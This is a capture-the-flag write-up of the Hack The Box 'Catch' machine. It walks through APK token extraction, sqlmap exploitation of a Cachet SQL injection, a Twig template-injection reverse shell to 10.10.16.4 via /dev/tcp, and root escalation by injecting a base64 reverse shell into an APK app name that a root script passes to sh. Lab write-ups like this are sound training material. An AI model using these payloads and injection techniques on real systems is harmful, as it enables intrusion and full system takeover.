## Default Information
IP Address: 10.10.11.150\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.150    catch.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.11.150 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-04-14 04:28:51 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 3000/tcp on 10.10.11.150                                  
Discovered open port 80/tcp on 10.10.11.150                                    
Discovered open port 8000/tcp on 10.10.11.150                                  
Discovered open port 22/tcp on 10.10.11.150                                    
Discovered open port 5000/tcp on 10.10.11.150 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 3000	| tcp | NIL | Open |
| 5000	| tcp | NIL | Open |
| 8000	| SSH | syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu)) | Open |

### Web Enumeration on port 80

First, let us use gobuster to enumerate possible endpoints on http://catch.htb. However, http:///catch.htb/javascript returns a status code of 403 on manual inspection and the other 2 endpoints do not provide any meaningful results.

```
http://10.10.11.150:80/index.php            (Status: 200) [Size: 6163]
http://10.10.11.150:80/index.php            (Status: 200) [Size: 6163]
http://10.10.11.150:80/javascript           (Status: 301) [Size: 317] [--> http://10.10.11.150/javascript/]
```

Navigating to http://catch.htb, we realize that we are able to download an apk from the homepage.

![Downloading an apk](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/downloading_apk.png)

### Analysis of apk
Now, we will analyze the apk using Mobsf. We will first download the java source code of the apk file. From the source code, we are able to find a subdomain which is http://status.catch.htb

```java
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_main);
    WebView webView = (WebView) findViewById(R.id.webview);
    this.mywebView = webView;
    webView.setWebViewClient(new WebViewClient());
    this.mywebView.loadUrl("https://status.catch.htb/");
    this.mywebView.getSettings().setJavaScriptEnabled(true);
}
```

We will then add the subdomain of catch.htb to our /etc/hosts

```
10.10.11.150    status.catch.htb catch.htb
```

From the generated report, we are also able to find several hard-coded secrets in the apk file that we have downloaded as well.

```
"gitea_token" : "b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0"
"lets_chat_token" : "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
"slack_token" : "xoxp-23984754863-2348975623103"
```
### Web Enumeartion on port 3000
Let us now navigate to http://catch.htb:3000. From the site, we are able to find out that we are using Gitea version 1.14.1

```
<div class="ui left">
	Powered by Gitea Version: 1.14.1 Page: <strong>1ms</strong> Template: <strong>1ms</strong>
</div>
```

Looking up this version of Gitea, we are able to find CVE-2020-14144 which is an authenticated remote code execution for Gitea. However, we would require to be authenticated.

Next, we will attempt to use gitea_token that we have found earlier in the cookie field to check if we can authenticate onto the Gitea website. Unfortunately, we are unable to do so. This looks like a deadend and we will try to look at our attack vectors instead.

![Gitea authentication](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/gitea_authentication.png)

### Web Enumeration on port 300

Navigating to http://catch.htb:5000, we realize that this is a site of Let's Chat. Recalling that we have the tokens for let's chat, we can then attempt to authenticate using the token. 

Let us try to enumerate the endpoint for http://catch.htb:5000 using Gobuster.

```
http://catch.htb:5000/files                (Status: 401) [Size: 12]
http://catch.htb:5000/media                (Status: 301) [Size: 177] [--> /media/]
http://catch.htb:5000/logout               (Status: 302) [Size: 28] [--> /login]
http://catch.htb:5000/login                (Status: 200) [Size: 2625]
http://catch.htb:5000/Connections          (Status: 401) [Size: 12]
http://catch.htb:5000/Login                (Status: 200) [Size: 2622]
http://catch.htb:5000/users                (Status: 401) [Size: 12]
http://catch.htb:5000/account              (Status: 401) [Size: 12]
http://catch.htb:5000/connections          (Status: 401) [Size: 12]
http://catch.htb:5000/messages             (Status: 401) [Size: 12]
http://catch.htb:5000/Files                (Status: 401) [Size: 12]
http://catch.htb:5000/Account              (Status: 401) [Size: 12]
http://catch.htb:5000/Media                (Status: 301) [Size: 177] [--> /Media/]
http://catch.htb:5000/Users                (Status: 401) [Size: 12]
http://catch.htb:5000/robots.txt           (Status: 200) [Size: 25]
http://catch.htb:5000/FILES                (Status: 401) [Size: 12]
http://catch.htb:5000/Messages             (Status: 401) [Size: 12]
http://catch.htb:5000/Logout               (Status: 302) [Size: 28] [--> /login]
http://catch.htb:5000/rooms                (Status: 401) [Size: 12]
http://catch.htb:5000/MEDIA                (Status: 301) [Size: 177] [--> /MEDIA/]
http://catch.htb:5000/Robots.txt           (Status: 200) [Size: 25]
http://catch.htb:5000/CONNECTIONS          (Status: 401) [Size: 12]
http://catch.htb:5000/LOGIN                (Status: 200) [Size: 2621]
http://catch.htb:5000/transcript           (Status: 401) [Size: 12]
http://catch.htb:5000/ACCOUNT              (Status: 401) [Size: 12]
```

Searching up exploits for Let's Chat, we are unable to find any usable exploits. However, searching up the documentation for Let's Chat, we are able to find the REST API endpoints.

First of all, let us try to get all the users present on this site.

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -iLk http://10.10.11.150:5000/users

[
  {
    "id": "61b86aead984e2451036eb16",
    "firstName": "Administrator",
    "lastName": "NA",
    "username": "admin",
    "displayName": "Admin",
    "avatar": "e2b5310ec47bba317c5f1b5889e96f04",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18",
      "61b8708efe190b466d476bfb"
    ]
  },
  {
    "id": "61b86dbdfe190b466d476bf0",
    "firstName": "John",
    "lastName": "Smith",
    "username": "john",
    "displayName": "John",
    "avatar": "f5504305b704452bba9c94e228f271c4",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86e40fe190b466d476bf2",
    "firstName": "Will",
    "lastName": "Robinson",
    "username": "will",
    "displayName": "Will",
    "avatar": "7c6143461e935a67981cc292e53c58fc",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86f15fe190b466d476bf5",
    "firstName": "Lucas",
    "lastName": "NA",
    "username": "lucas",
    "displayName": "Lucas",
    "avatar": "b36396794553376673623dc0f6dec9bb",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18"
    ]
  }
]
```


Afterwards, we will try to find out the current user that we are registered as. From the output, we can see that we are currently registered as the Administrator user.

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -iLk http://catch.htb:5000/account
{
  "id": "61b86aead984e2451036eb16",
  "firstName": "Administrator",
  "lastName": "NA",
  "username": "admin",
  "displayName": "Admin",
  "avatar": "e2b5310ec47bba317c5f1b5889e96f04",
  "openRooms": [
    "61b86b28d984e2451036eb17",
    "61b86b3fd984e2451036eb18",
    "61b8708efe190b466d476bfb"
  ]
}
```

Next, let us try to get all the rooms belonging to the Adminstrator user from the REST API as well. From the output, we realize that all the rooms belong to the Administrator user and there is a room id that is allocated to each room. We will take note of the room id that is allocated to each room.

We also realize that each of the room displayed are public rooms and there are no passwords set for each room. This means that we can readily access the rooms at any time.
```
┌──(kali㉿kali)-[~]
└─$ curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -iLk http://10.10.11.150:5000/rooms
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]
```

Let us now try to obtain the messages for Cachet Updates and Maintenance. From the output, we are able to obtain the credentials of John on http://status.catch.htb. Let us keep the credentials in mind as we move on for our enumeration of other ports.

```
curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -iLk http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages
[
  {
    "id": "61b8732cfe190b466d476c02",
    "text": "ah sure!",
    "posted": "2021-12-14T10:34:20.749Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b8731ffe190b466d476c01",
    "text": "You should actually include this task to your list as well as a part of quarterly audit",
    "posted": "2021-12-14T10:34:07.449Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b872b9fe190b466d476c00",
    "text": "Also make sure we've our systems, applications and databases up-to-date.",
    "posted": "2021-12-14T10:32:25.514Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87282fe190b466d476bff",
    "text": "Excellent! ",
    "posted": "2021-12-14T10:31:30.403Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87277fe190b466d476bfe",
    "text": "Why not. We've this in our todo list for next quarter",
    "posted": "2021-12-14T10:31:19.094Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87241fe190b466d476bfd",
    "text": "@john is it possible to add SSL to our status domain to make sure everything is secure ? ",
    "posted": "2021-12-14T10:30:25.108Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87010fe190b466d476bf9",
    "text": "Sure one sec.",
    "posted": "2021-12-14T10:21:04.635Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86fb1fe190b466d476bf8",
    "text": "Can you create an account for me ? ",
    "posted": "2021-12-14T10:19:29.677Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86f4dfe190b466d476bf6",
    "text": "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ",
    "posted": "2021-12-14T10:17:49.761Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  }
]
```
### Web Enumeration on port 8000
First, we will use gobuster to enumerate all the endpoints on http://catch.htb:8000

```
http://10.10.11.150:8000/favicon.ico          (Status: 200) [Size: 1034]
http://10.10.11.150:8000/index.php            (Status: 200) [Size: 8903]
http://10.10.11.150:8000/robots.txt           (Status: 200) [Size: 24]
http://10.10.11.150:8000/robots.txt           (Status: 200) [Size: 24]
http://10.10.11.150:8000/cgi-bin/             (Status: 301) [Size: 320] [--> http://10.10.11.150:8000/cgi-bin]
http://10.10.11.150:8000/dist                 (Status: 301) [Size: 318] [--> http://10.10.11.150:8000/dist/]
http://10.10.11.150:8000/fonts                (Status: 301) [Size: 319] [--> http://10.10.11.150:8000/fonts/]
http://10.10.11.150:8000/img                  (Status: 301) [Size: 317] [--> http://10.10.11.150:8000/img/]
```

Navigating to http://catch.htb:8000, we realize that this is a page that is running on the Cachet framework. We will keep this in mind as we continue with our exploitation.

## Exploit
### SQL Injection in Catchet
Looking into Catchet, we realize that Catchet is vulnerable to CVE-2021-39165 which is an SQL Injection on Catchet. Using the reference from [here](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html), we shall try to use sqlmap to exploit the SQL Injection. 

We will now use sqlmap to check if the site is vulnerable to SQL Injection. From the output, it seems that the site is vulnerable to SQL Injection.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/catch]
└─$ sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.11#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:59:38 /2022-04-15/
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+'a'=? and 1=1) AND (SELECT 5402 FROM (SELECT(SLEEP(5)))OxdH)+--+
---
```

Next, we will use sqlmap to list all the databases on the web server

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/catch]
└─$ sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%27a%27)" --dbs 
available databases [5]:
[*] cachet
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Next, we will use sqlmap to list all the tables from the cachet database.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/catch]
└─$ sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%27a%27)" -D cachet --tables
+---------------------+
| actions             |
| cache               |
| component_groups    |
| components          |
| failed_jobs         |
| incident_components |
| incident_templates  |
| incident_updates    |
| incidents           |
| invites             |
| jobs                |
| meta                |
| metric_points       |
| metrics             |
| migrations          |
| notifications       |
| schedule_components |
| schedules           |
| sessions            |
| settings            |
| subscribers         |
| subscriptions       |
| taggables           |
| tags                |
| users               |
+---------------------+
```

Looking at the tables from the catchet database, we will try to dump the data from the users table. From the output, we are able to obtain the API keys for both admin@catch.htb and john@catch.htb
```
sqlmap "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet -T users --dump --threads 10 
+----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+---------------------+---------------------+--------------------------------------------------------------+-------------------+
| id | email           | active | level   | api_key              | password                                                     | username | welcomed | created_at          | updated_at          | remember_token                                               | google_2fa_secret |
+----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+---------------------+---------------------+--------------------------------------------------------------+-------------------+
| 1  | admin@catch.htb | 1      | 1       | rMSN8kJN9TPADl2cWv8N | $2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om | admin    | 1        | 2022-03-03 02:51:26 | 2022-03-03 02:51:35 | 5t3PCyAurH7oKann9dhMfL7t0ZTN7bz4yiASDB8EAfkAOcN60yx0YTfBBlPj | NULL              |
| 2  | john@catch.htb  | 1      | 2       | 7GVCqTY5abrox48Nct8j | $2y$10$2jcDURPAEbv2EEKto0ANb.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e | john     | 1        | 2022-03-03 02:51:57 | 2022-03-03 02:52:12 | 5N58LraMhWCeM6kVL1OgADG4DoUkViSmJLowCth6ocSLv9s7DyDmNWgYEJlB | NULL              |
+----+-----------------+--------+---------+----------------------+--------------------------------------------------------------+----------+----------+-----------
```
### Server-side Template Injection
Using the credentials for John that we have obtained earlier, we realize that this set of credentials can be used to login to http://catch.htb:8000.

Afterwards, we also realize that this dashboard is vulnerable to SSTI. This is because Cachet uses a vulnerable version of Twig that can be exeploited by SSTI. We can test for this vulnerable by putting the payload of ```{{3*3}}``` in the form fields of http://catch.htb:8000/dashboard/templates/create

![SSTI payload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/SSTI_payload.png)

Afterwards, we will send a POST request to http://catch.htb:8000/api/v1/incidents with the X-Cachet-Token header using the ```api_key``` value for john@catch.htb that we have obtained from the sqlmap earlier.

![Output of SSTI](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/SSTI_output.png)

Using the same method, we can first supply a reverse shell payload to http://catch.htb:8000/dashboard/templates/create

```
{{["/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/4000 0>&1'"]|filter("system")|join(",")}}
```

![Crafting reverse shell payload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/reverse_shell_payload.png)

Lastly, all we have to do is to send a POST request with the X-Cachet-Token to http://catch.htb:8000/api/v1/incidents to spawn the reverse shell.

![Obtaining reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/reverse_shell.png)

### Privilege Escalation to will
After obtaining the reverse shell, we notice that the usual commands like ```wget```, ```curl``` etc are not available. This led me to give an assumption that we are in a container. 

Now, let us first check the environment variables and see if we are able to find any .env files. In /var/www/html/Cachet, we are able to find an environment file. 

```
www-data@3f6f4581fcca:/var/www/html/Cachet$ ls -la | grep .env
ls -la | grep .env
-rw-r--r--  1 www-data www-data    717 Mar  3 03:22 .env
-rw-r--r--  1 www-data www-data    657 Mar  3 02:39 .env.example
```

Next, let us read the contents of the environment file. We actually noticed that we are able to obtain a database username and database password from the environment file. 

```
cat .env
APP_ENV=production
APP_DEBUG=false
APP_URL=http://localhost
APP_TIMEZONE=UTC
APP_KEY=base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
DEBUGBAR_ENABLED=false

DB_DRIVER=mysql
DB_HOST=localhost
DB_UNIX_SOCKET=null
DB_DATABASE=cachet
DB_USERNAME=will
DB_PASSWORD=s2#4Fg0_%3!
DB_PORT=null
DB_PREFIX=null

CACHE_DRIVER=file
SESSION_DRIVER=database
QUEUE_DRIVER=null

CACHET_BEACON=true
CACHET_EMOJI=false
CACHET_AUTO_TWITTER=true

MAIL_DRIVER=smtp
MAIL_HOST=
MAIL_PORT=null
MAIL_USERNAME=
MAIL_PASSWORD=
MAIL_ADDRESS=notify@10.129.136.74
MAIL_NAME=null
MAIL_ENCRYPTION=tls

REDIS_HOST=null
REDIS_DATABASE=null
REDIS_PORT=null

GITHUB_TOKEN=null

NEXMO_KEY=null
NEXMO_SECRET=null
NEXMO_SMS_FROM=Cachet

TRUSTED_PROXIES=
```

Using the database username and database password, let us attempt to ssh in. Fortunately, we are able able to ssh into the server.

```
┌──(kali㉿kali)-[~]
└─$ ssh will@10.10.11.150
will@10.10.11.150's password: 
will@catch:~$ id
uid=1000(will) gid=1000(will) groups=1000(will) 
```
### Obtaining user flag

```
will@catch:~$ cat /home/will/user.txt
<Redacted user flag>
```

### Privilege Escalation to root
Using linpeas, we realize that there is a verify.sh script that is available at /opt/mdm directory

```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 /opt/mdm/verify.sh                                                         
-rw-r----- 1 root will 33 Apr 16 07:22 /home/will/user.txt
```

Let us now inspect the source code of verify.sh. Froom the source code, we realize that verify.sh does the following actions:\
- Check for the signature of the apk file in /opt/mdm/apk_bin
- Check for the compileSDKVersion of the decompile apk in /opt/mdm/apk_bin using apktool
- Check if the APP_NAME in /res/values/strings.xml in the decompiled apk is "Catch"

Now, let us use pspy64s to inspect the background process of verify.sh. From pspy64s, we can find the commands that are being executed by the verify.sh script. We are also able to see that the process is being executed with UID of 0 which is root

```
2022/04/17 06:31:01 CMD: UID=0    PID=534055 | /bin/sh -c rm -rf /root/mdm/certified_apps/* 
2022/04/17 06:31:01 CMD: UID=0    PID=534057 | /bin/bash /opt/mdm/verify.sh 
2022/04/17 06:31:01 CMD: UID=0    PID=534056 | /bin/sh -c /opt/mdm/verify.sh 
2022/04/17 06:31:01 CMD: UID=0    PID=534063 | jarsigner -verify /root/mdm/apk_bin/e10b8a3148dc12f4d4add2e5.apk 
2022/04/17 06:31:02 CMD: UID=0    PID=534081 | /bin/bash /usr/bin/apktool d -s /root/mdm/apk_bin/e10b8a3148dc12f4d4add2e5.apk -o /root/mdm/process_bin                                                                                    
2022/04/17 06:31:02 CMD: UID=0    PID=534082 | /bin/bash /usr/bin/apktool d -s /root/mdm/apk_bin/e10b8a3148dc12f4d4add2e5.apk -o /root/mdm/process_bin 
2022/04/17 06:31:20 CMD: UID=0    PID=534111 | grep -oPm1 (?<=compileSdkVersion=")[^"]+ /root/mdm/process_bin/AndroidManifest.xml                                                                                                         
2022/04/17 06:31:20 CMD: UID=0    PID=534112 | /bin/bash /opt/mdm/verify.sh 
2022/04/17 06:31:20 CMD: UID=0    PID=534114 | xargs -I {} sh -c mkdir {} 
2022/04/17 06:31:20 CMD: UID=0    PID=534115 | sh -c mkdir Catch 
2022/04/17 06:31:20 CMD: UID=0    PID=534116 | mkdir Catch 
2022/04/17 06:31:20 CMD: UID=0    PID=534117 | mv /root/mdm/apk_bin/e10b8a3148dc12f4d4add2e5.apk /root/mdm/certified_apps/Catch/catchv1_verified.apk                                                                                      
2022/04/17 06:31:20 CMD: UID=0    PID=534118 | rm -rf /root/mdm/process_bin 
2022/04/17 06:31:20 CMD: UID=0    PID=534120 | /bin/bash /opt/mdm/verify.sh 
2022/04/17 06:32:01 CMD: UID=0    PID=534136 | jarsigner -verify /root/mdm/apk_bin/73f4579cf8bd2e138a2b2ebb.apk 
```

Looking at the app_check function, we realize that this function might be vulnerable to command injection attacks as we can supply the payload into the app_name of the /res/values/strings.xml file, and the $APP_NAME variable in the function only checks if the variable name contains the word "Catch".

```
app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
```

To exploit that, we would first have to disassemble the apk file so that we can access the /res/values/strings.xml file. 
```
┌──(kali㉿kali)-[~/Desktop/catch]
└─$ apktool d catch.apk
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1 on catch.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Next, we will move to modify the app_name value in the /res/values/string.xml file by adding our reverse shell payload in

```
<string name="app_name">Catch;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQwMDAgMD4mMQ== | base64 -d | bash</string>
```

Lastly, we will then build the apk and save it into exploit.apk file. 

```
┌──(kali㉿kali)-[~/Desktop/catch]
└─$ apktool b catch -o exploit.apk
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
```

Lastly, we will transfer exploit.apk to the server and move it to /opt/mdm/apk_bin

```
will@catch:/tmp$ cp exploit.apk /opt/mdm/apk_bin
will@catch:/tmp$ ls -la /opt/mdm/apk_bin
total 2724
drwxrwx--x+ 2 root root    4096 Apr 17 07:22 .
drwxr-x--x+ 3 root root    4096 Mar  3 14:23 ..
-rw-rw-r--  1 will will 2778532 Apr 17 07:22 exploit.apk
```

From pspy64s, we can see that the reverse shell payload is being executed
![apk exploit](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/apk_exploit.png)

### Obtaining root flag
```
root@catch:~# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>                                                                                      
```

## Post-Exploitation
### Server-Side Template Injection
In the SSTI vulnerability that we have exploited, we have to first create an incident template with the payload "{{["id"]|filter("system")|join(",")}}". Afterwards, we will have to send a POST request to /api/v1/incident for the exploit to be completed. 

This is because the POST request that is being sent to /api/v1/incident is required for the incident to be logged with the incident template and for the output to be reflected on http://catch.htb:8000/dashboard/incidents.

In the screenshot below, the output is captured on http://catch.htb:8000/dashboard/incidents when we refresh the page

![SSTI reflected on the website](https://github.com/joelczk/writeups/blob/main/HTB/Images/Catch/ssti_website.png)
